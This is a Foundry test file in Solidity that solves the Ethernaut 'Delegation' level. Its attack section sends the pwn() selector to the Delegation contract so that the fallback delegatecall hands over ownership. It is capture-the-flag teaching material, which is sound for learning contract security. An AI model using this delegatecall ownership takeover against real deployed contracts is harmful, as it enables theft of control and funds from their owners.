pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../Delegation/DelegationFactory.sol";
import "../Ethernaut.sol";

contract DelegationTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testDelegationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Determine method hash, required for function call
        bytes4 methodHash = bytes4(keccak256("pwn()"));

        // Call the pwn() method via .call plus abi encode the method hash switch from bytes4 to bytes memory
        address(ethernautDelegation).call(abi.encode(methodHash));


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}